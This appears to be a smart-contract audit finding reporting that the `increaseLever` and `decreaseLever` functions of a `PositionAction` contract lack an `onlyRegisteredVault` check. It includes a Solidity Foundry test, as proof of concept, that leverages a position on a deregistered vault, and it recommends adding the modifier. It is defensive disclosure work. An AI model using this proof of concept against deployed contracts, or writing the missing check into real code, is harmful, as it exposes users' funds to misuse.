# Vulnerability details

## Impact
Users can interact with their positions using the `PositionAction` contract, all actions fired from `PositionAction` should only hit registered vaults, this is done by adding the `onlyRegisteredVault` modifier. However, both `increaseLever` and `decreaseLever` functions miss this modifier.

This allows users to call these functions on unregistered vaults.

## Proof of Concept

Add the following test in `src/test/integration/PositionAction20.lever.t.sol`:

```solidity
function test_leverageUnregisteredVault() public {
    uint256 depositAmount = 1_000 ether;
    uint256 borrowAmount = 200 ether;

    deal(address(token), user, depositAmount);

    address[] memory assets = new address[](2);
    assets[0] = address(underlyingToken);
    assets[1] = address(token);

    // Vault is registered
    assertTrue(vaultRegistry.isVaultRegistered(address(vault)));

    vm.startPrank(user);
    // Deposit 1k ETH collateral
    token.approve(address(vault), type(uint256).max);
    vault.deposit(address(userProxy), depositAmount);

    // Borrow 200 ETH
    userProxy.execute(
        address(positionAction),
        abi.encodeWithSelector(
            positionAction.borrow.selector,
            address(userProxy),
            address(vault),
            CreditParams({amount: borrowAmount, creditor: user, auxSwap: emptySwap})
        )
    );
    vm.stopPrank();

    // Collateral is 1k ETH, debt is 200 ETH
    (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
    assertEq(collateral, depositAmount);
    assertEq(debt, borrowAmount);

    // Unregister the vault
    vaultRegistry.removeVault(ICDPVault(address(vault)));
    assertFalse(vaultRegistry.isVaultRegistered(address(vault)));

    // Increase leverage
    vm.prank(user);
    userProxy.execute(
        address(positionAction),
        abi.encodeWithSelector(
            positionAction.increaseLever.selector,
            LeverParams({
                position: address(userProxy),
                vault: address(vault),
                collateralToken: address(token),
                primarySwap: SwapParams({
                    swapProtocol: SwapProtocol.BALANCER,
                    swapType: SwapType.EXACT_IN,
                    assetIn: address(underlyingToken),
                    amount: borrowAmount,
                    limit: 0,
                    recipient: address(positionAction),
                    deadline: block.timestamp,
                    args: abi.encode(weightedPoolIdArray, assets)
                }),
                auxSwap: emptySwap,
                auxAction: emptyPoolActionParams
            }),
            address(0),
            0,
            address(user),
            emptyPermitParams
        )
    );

    // Collateral increased, and debt increased
    (collateral, debt, , , , ) = vault.positions(address(userProxy));
    assertGt(collateral, depositAmount);
    assertGt(debt, borrowAmount);
}
```

## Recommended Mitigation Steps

Add the `onlyRegisteredVault` modifier to both `increaseLever` and `decreaseLever`.
